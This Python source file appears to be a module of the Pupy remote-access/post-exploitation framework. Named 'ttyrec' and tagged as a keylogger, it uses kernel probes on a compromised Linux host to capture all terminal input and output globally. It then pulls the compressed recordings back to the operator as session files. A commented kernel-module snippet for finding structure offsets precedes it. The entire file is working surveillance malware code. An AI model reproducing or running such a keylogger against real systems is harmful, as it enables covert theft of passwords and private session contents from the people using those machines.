# -*- coding: utf-8 -*-

# To build module to extract proper offsets:
# > cat find_offsets.c
# #include <linux/tty.h>
# #include <linux/tty_driver.h>
# #include <linux/tty_flip.h>
#
# int tty_get_x(struct tty_struct *tty) {
#     return tty->winsize.ws_row
# }
# EXPORT_SYMBOL(tty_get_x)
#
# const char * tty_get_name(struct tty_struct *tty) {
#     return tty->name
# }
# EXPORT_SYMBOL(tty_get_name)
#
# int tty_get_y(struct tty_struct *tty) {
#     return tty->winsize.ws_col
# }
# EXPORT_SYMBOL(tty_get_y)
#
# static struct tty_struct *file_tty(struct file *file)
# {
# 	return ((struct tty_file_private *)file->private_data)->tty
# }
# EXPORT_SYMBOL(file_tty)
#
# > cat Makefile
# obj-m += find_offsets.o
# all:
#     make -C $(KERNELDIR) M=$(PWD) modules

import os
import zlib
import struct
import json

from StringIO import StringIO

from pupylib.PupyModule import PupyModule, PupyArgumentParser
from pupylib.PupyModule import config

TTYREC_EVENT = 0x14000001

__events__ = {
    TTYREC_EVENT: 'keylogger'
}

__class_name__ = 'TTYRec'


def _to_unicode(x):
    for charset in ('utf-8', 'utf-16le', 'latin-1'):
        try:
            return x.decode(charset)
        except UnicodeDecodeError:
            pass

    return x


def _to_int(x):
    if x is None:
        return None
    elif isinstance(x, (int, long)):
        return x
    elif x.startswith('0x'):
        return int(x[2:], 16)
    else:
        return int(x)


@config(cat='gather', compat=['linux'])
class TTYRec(PupyModule):
    '''
    Globally capture intput/output to TTY. Compatible with kernels
    which have KProbes tracing. Right now backed module tested/works
    only on AMD64.
    To use this module you need to have offsets for your kernel:
        name: (struct tty_struct *tty)->name
        winsize: (struct tty_struct *tty)->winsize.ws_row
        private: ((struct tty_file_private *)file->private_data)->tty
    '''

    unique_instance = True

    dependencies = {
        'linux': ['ttyrec']
    }

    header = struct.Struct('<I8s16ssIfI')

    @classmethod
    def init_argparse(cls):
        cls.arg_parser = PupyArgumentParser(prog='ttyrec', description=cls.__doc__)
        commands = cls.arg_parser.add_subparsers(help='commands')
        start = commands.add_parser('start', help='Start TTYRec')
        start.add_argument('name', help='TTY name offset')
        start.add_argument('winsize', help='TTY winsize offset')
        start.add_argument('private', help='TTY private offset')
        start.set_defaults(func=cls.start)

        dump = commands.add_parser('dump', help='Dump TTYRec results')
        dump.set_defaults(func=cls.dump)

        stop = commands.add_parser('stop', help='Stop TTYRec')
        stop.set_defaults(func=cls.stop)

    def start(self, args):
        start = self.client.remote('ttyrec', 'start', False)

        if start(
            event_id=TTYREC_EVENT,
                name=_to_int(args.name),
                winsize=_to_int(args.winsize),
                tty_private=_to_int(args.private)):
            self.success('TTYRec started')

    def stop(self, args):
        self.dump(args)
        stop = self.client.remote('ttyrec', 'stop', False)
        if stop():
            self.success('TTYRec stopped')

    def dump(self, args):
        dump = self.client.remote('ttyrec', 'dump', False)
        data = dump()

        if not data:
            return

        dumpdir = self.config.get_folder('records', {'%c': self.client.short_name()})
        dests = {}

        data = StringIO(zlib.decompress(data))

        while True:
            header = data.read(self.header.size)
            if not header:
                break

            session, tty, comm, probe, pid, timestamp, lbuf = \
                self.header.unpack(header)

            comm = comm.strip().strip('\0')
            tty = tty.strip()
            filename = '{:08x}.{}.cast'.format(session, tty)

            pid = str(pid)
            lbuf = int(lbuf)
            resize = None

            payload = data.read(lbuf)

            if probe == 'R':
                resize = struct.unpack('<HH', payload)

            if filename not in dests:
                dest = os.path.join(dumpdir, filename)
                self.info('{} -> {}'.format(tty, dest))

                is_append = os.path.exists(dest)
                dests[filename] = open(dest, 'a')

                if not is_append:
                    header = {
                        'version':2,
                        'timestamp': timestamp,
                    }

                    if resize:
                        payload = None
                        header.update({
                            'width': resize[0],
                            'height': resize[1],
                        })

                    json.dump(header, dests[filename])
                    dests[filename].write('\n')

            elif resize:
                payload = '\033[18;{};{}t'.format(resize[1], resize[0])

            if payload:
                json.dump([
                    timestamp, probe, _to_unicode(payload)
                ], dests[filename])
                dests[filename].write('\n')

        for f in dests.itervalues():
            f.close()

    def run(self, args):
        args.func(self, args)
